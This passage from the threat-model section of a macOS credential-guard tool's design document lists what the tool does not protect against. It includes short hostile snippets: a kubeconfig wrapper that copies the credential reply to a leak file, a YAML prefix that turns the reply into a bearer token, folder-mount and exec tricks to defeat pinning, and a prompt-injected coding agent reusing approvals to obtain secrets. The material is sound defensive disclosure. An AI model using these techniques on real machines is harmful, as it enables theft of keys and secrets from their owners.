expiration within the entry's duration) before the program that ran nazar sees it.

## 5. What nazar does not protect against

### 5.1 Terminal and IDE rules with `gate: none` or `scope: app`

Any program can run `open -a Terminal evil.command` without a permission prompt, and the new
window really is Terminal. The same goes for iTerm2, Ghostty, Warp, VS Code, Cursor and other
terminals or editors that run a script on request. A rule on such an app with `gate: none` or
`scope: app` therefore effectively covers **any program on the Mac**.

nazar allows this on purpose. It is **your choice**, with no restriction and no warning
(decided in review). The safer pattern for terminals is `scope: session`: a new window is a new
session, so the trick gets a prompt.

### 5.2 Anything inside an approved scope

By design, Claude Code and the scripts it writes sign silently inside an approved run of it
(an approved tab, for a rule the terminal satisfied), for the destination or kind of signature
that was approved there (4.11): a rule on `claude` matches any process with Claude Code in its
chain, so whatever that run starts, a nested `claude -p` included, is inside, and an approval
for github.com covers every github.com repository and user. Narrow this with per-caller rules,
`scope: session` rather than `app`, short `expire`s, and `nazar revoke`. The flip side, a rule
on such a tool covering whatever can *start* it, is 5.12.

### 5.3 Malware driving an approved app

For example AppleScript sending "write text" to iTerm. macOS asks you before allowing
Automation control of another app.

### 5.4 Root or kernel compromise

Root can read process memory, alter the log store and replace the agent.

### 5.5 What servers do with access

A GitHub account key reaches every repo the account can. Limit access on the server side, for
example with read-only deploy keys, and give those keys their own rules.

### 5.6 `dialog` doesn't identify the person

It proves someone is physically at the keyboard, not who. Use `login` where that matters.

### 5.7 The audit redaction allowlist

Command lines in audit lines are redacted with an **allowlist**, not by hunting for secrets:
an argument is kept only if it is a short plain word (up to 32 characters of letters, digits,
`.`, `_`, `-`, `/`; a bare flag like `-v` or `--force` is kept, `-p2222` and `--flag=value` are
not; no `:`, `=`, `@`, `?`, `&`, whitespace or quotes). Everything else becomes `…`.

Its known limit: **a secret that is itself a short plain word survives**. Examples:
`--password hunter2`, `sshpass -p hunter2`, or a 20-character AWS access key ID passed as an
argument. If your command lines carry such values, set `audit.args: none`, which logs only the
program name and the argument count. Full command lines are never logged.

### 5.8 Log retention

macOS decides how long unified-log entries survive, by size and age, and that can't be set per
subsystem without root or a configuration profile. On the development Mac the oldest entry of
any kind was about 19 days old. An opt-in export may come later if that proves too short.

### 5.9 Delivered secrets (Phase 2)

Once a secret is delivered, the receiver can copy it; rules control *who receives* it, not what
it does afterwards. A secret delivered with the `env` method is readable by any of your
processes through `ps eww` while the receiver runs (measured on macOS 27 for non-Apple
binaries), which is why `env` must be allowed explicitly per secret.

`late-env` (`nazar run`, Milestone 10) keeps the value off disk, off every command line and out
of the startup environment of nazar, `npx` and the receiver: nazar-agent hands it over a
one-time socket to the process it has just checked against the plan (program and its code,
arguments, `/` as folder, the whole environment, every pinned file, checked again right before
the write, with no volume mounted or unmounted meanwhile), or, behind `npx`, to a process below it running the pinned `node` with the target
package's bin as its main script. On the Mac this is checked end to end on nazar-agent's own
process seams, with real `npx` and the bundle's CLI and loaders (`make integration-run`). What that
does not cover:

- **The receiver's children.** The loader sets the variable in the receiver; every process the
  receiver starts inherits it in its startup environment, visible to `ps eww`.
- **What a launcher downloads, and unpinned code.** Pinned: the `node` image, npm's `npx-cli.js`
  entry file, absolute files on the command line. Not pinned: the rest of npm, `~/.npmrc` and
  `<node>/etc/npmrc`, the npx cache, the package and its dependencies, whatever the receiver
  loads, the libraries `node` links. The `npx` peer rule is a selector, not a boundary: it checks
  the peer's image path, main script and ancestry, not its code identity or environment, so a
  dependency's install script (it runs before the target, with the loader's variables) can
  rewrite the bin in npm's cache, or start the real bin with a preload of its own, and is then
  served; so can a process of yours that writes npm's cache or config. Writing the version in
  the command line and in the rule (`@brave/brave-search-mcp-server@2.0.1`) narrows the package
  itself, not its dependencies. The dialog shows the arguments redacted, so it does not name the
  package; the rule does.
- **Remembered approvals.** Under `scope: session` any process of the same Claude Code run (its
  shell tool, a prompt-injected agent) can start the identical command line again without a
  dialog; with an edit to an unpinned file above, that hands it the value silently. `scope: use`
  asks every time.
- **The window after the write.** The pinned script is checked right before the value is
  written; a swap after that and before the interpreter reads it runs with the value. The
  receiver's own script and files are pinned, not the folders above them (they are yours and
  change as you work): a process of yours that moves one aside with another script in its place
  between the exec and the interpreter's read, and back before the write, is served.
- **Volumes mounted during a run.** Any process of yours can mount a disk image or a network
  share over a folder it owns (`hdiutil attach -mountpoint`, as you, no password), which hides
  what the folder holds without changing it: a loader or script put in front of the pinned one
  that way and taken away again leaves every pin matching (measured on macOS 27). So
  nazar-agent watches every mount and unmount on the Mac from before it takes the pins until the
  write (`kqueue` `EVFILT_FS`) and refuses a run during which there was one, and it refuses a
  pinned file or folder, the receiver's or the loader's, on a volume a process of yours mounted
  (macOS records who mounted each volume; a share's server could answer nazar and the program
  differently). What remains: a run is refused when anything else mounted or ejected a volume
  meanwhile (a disk image opened, a disk plugged in, a Time Machine backup): the program starts
  without the value, and the next start asks again; a process that keeps mounting and
  unmounting keeps every run from the value. A file system left mounted over a folder of yours
  from before the run that macOS records as mounted by root (only an administrator can install
  one that mounts that way) and that answers nazar and the program differently is not caught.
- **Two execs in one moment.** macOS reports execs that follow each other before nazar-agent
  takes the event as one, read after the later. nazar checks the image it read, so a first image
  that ran only for that moment is seen only if it changed what was read. The CLI execs the
  plan's file right after checking it, so getting another first image needs a file swapped
  inside a `defaults.trustedPath` folder in between: the trust those folders already carry.
- **The loader's own file.** The receiver runs nazar's loader from nazar-agent.app
  (`Contents/Resources/loaders`) before anything else, and whoever can change what it runs there
  is handed the value. macOS checks the bundle's seal only when it first assesses the app, so
  nazar-agent checks the loaders itself: its own code carries the copies it was built with, and
  it refuses a run whose loader differs by a byte or whose loader folder holds anything else
  (Python would import a module or cached bytecode found there first). It also pins every folder
  above the loader's that a process of yours can move: each one in a folder you can write or own
  (`loaders`, `Resources`, `Contents`, `nazar-agent.app`, `~/Library/nazar` and `~/Library` for
  the installed agent; not `~`, whose folder `/Users` is root's). Moving a folder changes only that
  folder's own ctime, never that of the files in it, so a loader swapped by moving a folder above
  it aside and back would otherwise still match. It checks the file and all those folders again
  at the exec and right before the write, so a loader changed, swapped or joined by another file
  during the run is never served, even if put back. Without the folder pins no luck would be
  needed: the swap has to land between the check at the exec and the interpreter's read of its
  loader (tens of milliseconds, which a process watching the CLI's exec hits), and the put-back
  is up to the attacker, whose loader is the one that connects. What remains is
  macOS's own bundle protection: a notarized release adds App Management for app bundles (to be
  confirmed for the installed location, an attended check, spec 10.1). A change to `~/Library` itself (an
  entry added there) during a run refuses that run; it is rare.
- **Code that runs before the loader.** Python's `.pth` files in site-packages a user process
  can write, and anything the interpreter loads before `--require`/`sitecustomize`.
- **Reading the receiver's memory.** A receiver without the hardened runtime (Homebrew's `node`,
  mise's `python3`) can be read by a debugger running as you where macOS allows it (Developer Mode);
  root can read any. nazar starts Node with `--disable-sigusr1`, so a process of yours can't
  open Node's inspector with SIGUSR1 (`--inspect*` on the command line is refused).
- **The caller's Mach bootstrap port.** `nazar run` resets what its caller leaves in the process
  (fds above 2, umask, the core limit, signals, the Mach exception ports), but cannot replace the
  bootstrap port: a caller that starts `nazar` with a port of its own answers the receiver's Mach
  service lookups. The value's path uses none. A receiver that checks TLS through macOS's trust
  service would ask the caller's stand-in; Node and Python check against their own CA files by
  default.
- **Linux.** The Linux process seams and the Linux CLI reset are test grade: no Linux agent
  ships. There a parent can ptrace the receiver or inject fds after the sweep.
- **Signals in the last microseconds.** A signal that arrives between the CLI's reset and
  `execve` goes to the CLI's own handler and is dropped.

Storage (Milestone 8): a secret's Vault item restored **on this Mac** from a backup of the login
Keychain database (Time Machine) opens the secret again, even after `nazar secret rm`: with
CryptoKit there is no enclave-side object a delete could destroy (spike S15 checks). Off this
Mac the item opens nothing.

### 5.10 Keys are tied to one Mac

Not a vulnerability, but a consequence: no import, export, backup or sync. Losing the Mac, or
wiping it, loses the keys. Keep a way to get back into every account that doesn't depend on a
nazar key.

### 5.11 A process that can read nazar's Keychain item (unverified)

If the Keychain access list on the handle item does not in fact stop other processes (4.1; the
cross-process read is still an open attended check, spec 10.1), anything running as you can take
the handle of a `dialog`- or `none`-gated key and sign with it directly, with no prompt and no
audit line, because the Secure Enclave itself asks for nothing on those keys (4.8). The same
holds for every secret (Phase 2): its item holds the handle and the sealed value, and no secret
key has user presence yet, so such a process could open it. Keys whose
gates are all `login`/`block` are unaffected: the chip asks for your authentication whoever holds
the handle.

### 5.12 Rules on tools that run arbitrary commands or code

`signed:` and `path:` matchers match **any** process in the chain, ancestors included (`app:`
matches only the chain's first GUI app). So a rule on a signed tool that runs commands or code
means *anything that can start that tool in that scope*:

- A malicious script in an iTerm tab runs `claude -p "git push …"`. Its `ssh` now has `claude`
  in the chain, so the `claude` rule matches. Since Milestone 7 a `session` approval for that
  rule belongs to the Claude Code run it was given to (4.2), so this new run gets its own
  prompt; it goes through silently only under a `gate: none` rule, or when the approved run
  itself starts it (5.2).
- A `gate: none` rule on a non-Apple-signed interpreter (`signed: {team: <python.org>}`, a
  signed Node) silently covers every script that interpreter runs, from anywhere. 4.4 rejects
  Apple's shells and interpreters under `gate: none`; it can't recognise third-party ones.
- **"Start" includes exec.** A process can fork its own client and then exec the signed program
  over itself (`exec claude mcp serve`, which just waits): exec keeps the PID and start time, so
  the client's chain has a live, validly signed `claude` as its parent although Claude Code never
  ran anything. A `signed:` rule therefore covers any of your processes that can run that
  binary, whatever the tool does; under `gate: none` it is close to "every program of yours", as
  `any` is, and "match the narrowest tool" does not narrow that. Keep `dialog` or `login` on a
  `signed:` rule whose key matters. (Closing this would need tracking exec, which nazar doesn't.)
- **"Anything that can start it" includes processes outside any app**. `signed:`
  matches a process in an *unknown* chain too (4.2): Claude Code in a tab whose
  orphaned `iTermServer` nazar never saw (5.14) keeps Claude Code's rule. So a program with no
  app above it (a LaunchAgent, cron, an `ssh` login to this Mac, a process that double-forked
  out of its tab) that starts `claude` gets the `claude` rule. Before, it got only
  `any`/`unknown` rules directly; it could already get a known chain by launching an app bundle
  of its own hidden (`open -g -j`; nazar does not ask an app for a signature to call it the
  chain's app), at the cost of a brief Dock icon, and have that app start `claude`. What the
  change gives up is that Dock icon. Two consequences:
  - **Leaving a chain sheds the ancestors' earlier rules for the rule of a tool started after.**
    With `- apps: [someagent], gate: login` above `- apps: [claude], gate: none`, a process under
    `someagent` that runs `claude` gets rule 1; one that double-forks out of the chain first and
    then runs `claude` gets rule 2. It never gets a rule *of* an ancestor it left (the ancestors
    leave with the chain, and `app:` never matches an unknown chain), and with an `apps: [unknown]`
    rule above the tool's rule it gets that. If an ordering like this matters to you, keep
    `gate: dialog`/`login` on the tool's rule or put `apps: [unknown]` first. (The hidden app of
    the previous point already gave the same, for an `app:` ancestor rule.) A config that has
    a `signed:` rule above a stronger `apps: [unknown]` rule got looser with this change
    without an edit; `config check` warns about it, naming both rules.
  - A chain cut off before `launchd` (a parent vanished, a recycled PID, the depth limit) may be
    missing exactly such ancestors and matches no `signed:` rule. An unknown chain is
    never remembered, so each request under a prompting rule asks again.

Mitigations: match the narrowest tool you can (the final `ssh`/`git` caller's app, not the agent
that may spawn them), keep `gate: dialog` or `login` on rules for agents and interpreters, prefer
`scope: use` for keys those rules reach, and read the chain shown in the dialog: it names the
process that satisfied the matcher when that process isn't the one asking.

### 5.13 Nazar UI.app is a client like any other, untrusted by design

Nazar UI.app (optional, spec 6.1) has no access of its own: every read and action is a `nazar`
command, and anything that loosens access is staged and needs the login gate on the agent's
screen, exactly as for an AI agent at the terminal. The agent trusts nothing about it: its
caller chain is recorded (`Nazar UI → nazar`) like anyone's. The UI's own checks protect the
person reading it, not the keys:

- It never sees a secret's value: the agent answers a value command only to the genuine nazar CLI
  (4.10), and the UI never runs one.
- Adding a secret from it gives the value to the CLI only (Milestone 11): on the stdin of
  `nazar secret add`, never an argument, a file or a variable, written only after the running
  CLI passed the signature check; then the pipe is closed and the app's copy wiped. The window
  is not a terminal, so the agent writes the new secret blocked for every app with no rule; the
  rule is a second change with its own Touch ID. In the Secrets tab the value exists only in the
  Add sheet's hidden field: on Add it is copied once into the runner's input and the field is
  emptied in the same step, and Cancel or closing the sheet empties it too; the tab's model takes
  a value only as that input, and nothing in the window reveals, copies or stores one.
  **Residual:** the hidden text field holds a string the app cannot wipe, so the value can stay
  in the app's memory until it is reused, as for any app's password field; and macOS may offer
  its own password AutoFill on a hidden field (nazar asks for none; an attended check confirms
  none is offered).
- Its Kubernetes tab (Milestone 13) edits a context's rules with `nazar k8s rule …` (never with a
  receiver: it sends no `--to` or `--no-to`, which the CLI and nazar-agent refuse anyway) and
  forgets a context with `nazar k8s forget`, after an alert that says the CLI then removes the
  kubeconfig entries nazar added (only those still exactly nazar's) and certificates already
  handed out stay valid until they end; nothing else: the window itself never reads the
  kubeconfig, the CA certificate file or the Vault, never runs `k8s ca` or `k8s credential`, and
  `k8s list` carries no key, minted certificate or CA certificate for it to show (no UI fixture
  may hold a PEM block).
- It runs only a CLI signed as nazar's (4.10), so a program that is not nazar can't answer in
  the window in nazar's place. It can still draw its own windows that look like nazar's, as any
  process can (4.5's UI-redress limit).
- `nazar ui` opens whatever app Launch Services has for `dev.nazar.ui`. A program of yours can
  register another one; it gains nothing the user's own processes don't already have, but it
  could imitate the window. Open the app you installed (`/Applications/Nazar UI.app`) when in
  doubt.
- It runs nothing when closed: no menu bar item, no login item, no background process. Quitting
  stops every stream it started; if it crashes instead, a `nazar … --follow` child it started
  ends at its next write (a closed pipe), not at once.

### 5.14 An app's own helper, after the app restarted

Milestone 7 (spec 4.1 step 3): a chain that reaches `launchd` under a process nazar-agent saw
directly below a running app of its own non-Apple team, that answers for itself (macOS resets a
process's responsibility to itself when the process responsible for it exits) and is older than
the one running app of that bundle ID and team, is that app's chain. This is what keeps an iTerm2
tab iTerm2's after iTerm2 updated and restarted (its tabs run on under the old `iTermServer`).

What it does **not** open:

- **Leaving a chain still sheds nothing.** Only a process the app itself started is ever seen
  directly below the app. A process that double-forks out of a tab heads a chain whose top was
  never there, so it stays unknown, also after the app quits and comes back: a detached copy of
  iTerm2's own signed `iTermServer` started from under `claude`, or a detached `claude` when
  Claude.app opens later, does not get the app's rules (both are tests). The chain-shedding
  attack that keeps the responsible-process lookup display only (4.2) stays closed: no `app:`
  rule, no `scope: app` or session approval. A `signed:` rule for a process that is
  in such a chain still matches it (what that concedes, a detached process
  that starts the tool itself included, is 5.12), as it matches the iTermServer copy itself
  under a `signed:` rule for iTerm2's *team*: name an app with `app:`, never by its team.
- **No other app, no recycled PID:** the helper binds only to an app of the bundle ID and team
  it was seen under, and only that exact process (PID and start) counts.
- **Sessions are never shared with a real tab:** the session root is found below the helper, so
  an approval given to a tab covers that tab, and a `scope: app` approval ends when the app it
  was given under quits.

What it does: whatever the app itself started keeps the app's rules across the app's restart;
"the app itself" is any instance of it, including one a program opened (`open -n -a iTerm`), with
the window that took (5.1), paid once.
A program that gets the app to start something (`open -a iTerm2 evil.command`, a new tab) has
that already, with a window (5.1); one that drives such a helper over the helper's own interface,
where the helper allows that, has it with no window, exactly as it does while the app runs. The dialog's chain line (`iTerm2 (via iTermServer-…)`) and
the audit line (`chain=` starts with the helper) show the attribution.

**What the agent saw survives its own restarts.** Kept in memory only, every install or crash
of nazar-agent would leave each tab that had outlived an iTerm2 update `unknown`, matched only by
`any`/`unknown` rules (for example
`chain="iTermServer-3.7.4(4100, H7V7XYVQ7D:iTermServer) > login > bash > claude-code > ssh"`, no
`app=`). So each record (the helper's PID and start time, its team, the app's bundle ID) is kept
in the vault item `state/helpers`. A helper no agent ever saw below its app still leaves its tabs
`unknown` (for example `chain="iTermServer-3.7.4(4100, H7V7XYVQ7D:iTermServer) > login > bash >
claude-code(…, Q6L2SF6YDW:com.anthropic.claude-code) > bash > git > ssh"`); the Claude Code in it
still matches Claude Code's own `signed:` rule all the same (4.2, 5.12), one request at a time.
Why keeping the records opens nothing:

- **Only nazar-agent writes it.** It is a Vault item like `config/approved` and `state/trust`
  (4.1, 4.10): its access list trusts only the agent's signature, an item with any other access
  list is never read or written, and one another program planted with the agent's own access list
  is refused by securityd's partition check (another program: code not signed by nazar's team,
  4.10). A process that could forge it could forge the approved config, which decides far more.
  The agent adds a record only as before: on seeing the helper directly below its running app.
  (If the access list does not in fact stop other processes, 5.11, the key handles go with it;
  this item is the least of it.)
- **Records of an older rule do not carry over.** A record can be re-checked against its live
  process, not against having once been directly below its app, so the item carries a version
  that is bumped whenever what may be recorded changes; an install of such a build starts empty.
- **A record names one process.** PID plus start time (microseconds); on load a record is kept
  only for a live process with exactly that ref, still signed by the team it was seen under, and
  the rest are dropped. A recycled PID, an old copy of the item (a keychain restored from a
  backup), a record from another Mac or user name no live process, and helperApp's checks
  (answers for itself, the one newer app of that bundle ID and team) still apply on every use.
- **Losing it fails closed.** An item that is gone, unreadable (another build's, planted, a locked
  keychain) or corrupt only forgets helpers: the agent runs on with what it sees itself, logs it
  once, never writes over an item it could not read, and `nazar status` names an unreadable one
  with the command that removes it. Writes run in the background, at most one a second, so a
  request never waits for the Keychain and churning helpers can't turn into a stream of writes.

So the agent knows what an agent that never restarted would know, nothing more. The cost, failing
closed: a helper no agent saw below its app (nothing used nazar through that helper before the app
restarted) stays `unknown`; its tabs work again once reopened.

### 5.15 Clients and keys outside nazar

nazar guards the keys it holds, for the programs that ask its socket. It cannot guard a key ssh
finds elsewhere: one still loaded in Apple's `ssh-agent` (`$SSH_AUTH_SOCK`), which ssh uses for
every host without an `IdentityAgent`, a key file in `~/.ssh`, or a `Host` block that names
nazar's key file but asks another agent for it. Nor can it make git sign through it: that is
`gpg.ssh.program`, a setting of the user's.

Since Milestone 7 `nazar status` names what it can see of this (spec 6, "Client-side checks"):
the hosts of `~/.ssh/config` that are nazar's but not wired right, git's signing program and key,
and the keys another agent on `$SSH_AUTH_SOCK` holds, each with the fix. The checks run in the
CLI, read-only, after nazar-agent has answered, and decide nothing: a program that can run
`nazar` as the user learns what `ssh -G`, `git config --global` and `ssh-add -l` already tell
it, and is granted nothing. nazar-agent itself never runs `ssh` or `git`, and is never asked for
its own key list by the checks (there the CLI would be a caller offered nothing, reported like
any other, 4.9). What stays unseen: keys only a wildcard `Host` block or `ssh -i` uses, keys on
disk that ssh offers to hosts outside nazar, and a repository's own git config overriding the
global one. Retiring the exportable keys is the user's job; nazar names them.

### 5.16 A kubeconfig that wraps the plugin

client-go runs the exec plugin directly, with its stdout the write end of a pipe kubectl reads.
Malware that can edit a kubeconfig can make its exec entry `/bin/bash -c "exec > >(tee
/tmp/leak); exec env KUBERNETES_EXEC_INFO=… /path/to/nazar k8s credential hydra"`: both hops
`exec`, so the process on the control socket is still the genuine CLI with kubectl as its
parent, while the cluster info is whatever the script wrote and the reply would be copied to a
file. nazar-agent therefore checks, before any prompt and whatever approval is cached, and again
at mint time, that the CLI's stdout is the write end of a pipe whose read end kubectl (the
program that ran the plugin, `chain[1]`, whatever it is) holds, matching the pipe by its kernel handles (macOS `proc_pidfdinfo`,
`PROC_PIDFDPIPEINFO`), not by kind. The CLI's fd 1 must be the write end's only reference (not
`PROC_FP_SHARED`), so no other process can write to the pipe around the reply (a background job
the wrapper left, `(sleep 1; printf …) & exec nazar …`); os/exec closes kubectl's copy as soon as
the plugin has started. kubectl's fd must be the read end's only reference (not
`PROC_FP_SHARED`) and close-on-exec (`PROC_FP_CLEXEC`), so a pipe kubectl opened itself, never
one it inherited. A launcher can give kubectl a pipe on stdin and point the plugin's stdout at
it through kubectl's stderr, which client-go gives every plugin. If the launcher keeps the read
end, the reference count shows the copy (as it does a second fd in kubectl, or a copy in flight
over a socket). If it closes its copy, kubectl holds the read end alone, but on stdin, which
kubectl forwards by design (`exec -i`, `attach -i`); an fd that survived an exec is never
close-on-exec, and Go never sets that flag on an fd it inherited, while the pipe os/exec makes
for the plugin is close-on-exec from the start. Once the check has seen one reference to each
end, only kubectl can copy the read end and only the CLI the write end. A relay (`tee`, `cat`),
a file, a terminal, a socket, the wrong end, a co-writer, a shared or inherited read end, or a
check that can't run is refused with one blocked audit line,
`the plugin's output does not go straight to the program that ran it` (Milestone 12). The
certificate and its key then reach only the pipe kubectl opened for the plugin, and kubectl holds
them in memory.

That read end is kubectl's alone, so no wrapper reads the key off the pipe, and the write end is
the CLI's alone, so no wrapper writes after or into the reply. A wrapper can still _prefix_ it,
though, without reading it: it can write to the CLI's fd 1 before the CLI runs (a pre-exec
write kubectl drains into its own buffer, so it is gone from the pipe by the time the check runs
and the check cannot catch it). client-go reads the plugin's stdout as YAML as well as JSON, so a
prefix that opens a scalar could take nazar's bytes into a field kubectl sends to the server the
kubeconfig names: a prepended `status:\n  token: >-\n    ` makes a YAML folded scalar that
captures nazar's whole reply as the value of `status.token`, and kubectl then sends
`Authorization: Bearer <nazar's reply>`, key included. With a co-writer's suffix, a flow
single-quoted scalar (`{…, status: {token: '` before the reply, `'}}` after; nazar's JSON has no
`'`) did the same even past a leading `---`, because the prefix left the line open and `---` is a
document marker only at column 0. nazar therefore starts its reply with a line break and a YAML
document-start marker (`\n---\n`): the marker is at column 0 whatever line a prefix left open,
it ends any block scalar a prefix opened, and inside a flow or quoted scalar it is a decoding
error. The reply then decodes as nazar's own document or not at all, and a prefix can only make
the credential fail, which anyone who can edit the kubeconfig can already do. Checked against
kubectl v1.37.1 with the real `nazar k8s credential` encoding, at `-v=10` (which dumps HTTP
bodies): across prepended/appended garbage, decoy-first and credential-first multi-doc YAML, a
wrong apiVersion, folded- and literal-scalar token prefixes and a flow-quoted token prefix with
and without a suffix, the key reaches neither the server (in any header, the URL or the body)
nor kubectl's own output.

What remains: the cluster info is still kubectl's claim. A wrapper that forges it gets past
check 2, but kubectl then presents the certificate to the server its kubeconfig names, proving
in TLS that it holds the key without handing it over, and the write-end check and the `---`
marker keep the reply from being reframed as a bearer token; a look-alike server learns only the certificate. A trusted
client that itself leaks what it reads, prints it, or hands its read end to another process
after the check, leaks by itself, the limit the k8s design's section 10 already names. Root, and
a debugger attached to kubectl or the CLI, read the key in memory. A kubeconfig is still as
sensitive as the rules that cover it: `scope: use` with `gate: login` shows every use, and
`ttl_cert` bounds the damage.

### 5.17 A locked Mac no longer stops rules that need no prompt

SSH keys, Kubernetes CA keys and secrets' keys are created
`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` unless made with `--only-when-unlocked` (or
`--always-ask`, which implies it): once you have logged in since the Mac started, the chip uses
them while the screen is locked too (measured on macOS 27: such a key is made, signs and agrees
while locked; a `WhenUnlocked` one is refused with `errSecInteractionNotAllowed`). So a locked
screen stops only what needs you (a `login` or `dialog` gate, an always-ask key); a program
already running as you (a cron job, an agent left working, or malware) gets what `gate: none`
rules and approvals remembered before the lock give it while you are away. Rules decide that, not
the screen. A key, secret or CA made with `--only-when-unlocked` keeps the old behaviour, enforced
by the chip for its life: nothing signs or opens with it while the Mac is locked, whatever the
rules or a compromised nazar do. Keys made before nazar had the choice have no access in their
vault record and are that kind; nazar lists them `only when unlocked` and never reports them as
working while locked. The access can't be changed: making a new key is the only way, and `k8s ca
create` for a context set up already refuses a different access rather than ignore it. Before
login after a restart no key works at all (`AfterFirstUnlock`), and the access is not a
substitute for FileVault.

### 5.18 An AWS session, once handed out

A session from Roles Anywhere is a bearer credential for the role, usable from any network until
its `Expiration` (the entry's `duration`, 1 hour at most). Revoking an approval in nazar stops new
sessions at once, not one already given; IAM's "revoke active sessions" ends those. The program
that received it can pass it on (`aws configure export-credentials` prints it; an SDK program
holds it in memory), and with no client list any program in an allowed chain can be that program
(a script Claude Code runs under a rule for Claude Code, say), holding a session for up to the
entry's `duration`; it could drive `aws` for that long anyway. Approvals are keyed per program,
not what that program does with the session, so an approval for a terminal tab is an AWS session
for anything in that tab, as for secrets on stdout (5.9, 5.12); a shorter `duration` narrows it. The role's own permissions bound
the damage, and the role's trust policy (which `aws ca create` prints with the trust anchor and
both CNs as conditions) decides which certificates AWS accepts: AWS trusts every certificate the
entry's CA issues for any role whose trust policy names its trust anchor, until the trust anchor
is disabled. A root certificate an attacker added to the Mac's trust store would let them read
the signed request and the reply; Amazon's roots are not pinned (aws design 9.4).

## 6. Residual assumptions

- The Secure Enclave and LocalAuthentication behave as Apple documents.
- Code signatures and team IDs identify publishers; a malicious update signed by an allowed
  publisher is trusted like any other.
- The attended checks still open (spec 10.1: dialogs from a LaunchAgent app,
  per-terminal attribution rows, Keychain reads from other processes (4.1, 5.11), S4 (4.5))
  hold, or the design changes as the spec's fallbacks say.
- The local ssh client announces agent forwarding with `session-bind` (4.7).
- Nobody builds a program carrying the LC_UUID of an agent build, or runs one from the agent's
  installed path, to forge `nazar log` entries (4.9).
- Only the publisher (or, for a developer's own builds, the developer) can sign with their team's
  certificate (4.10).
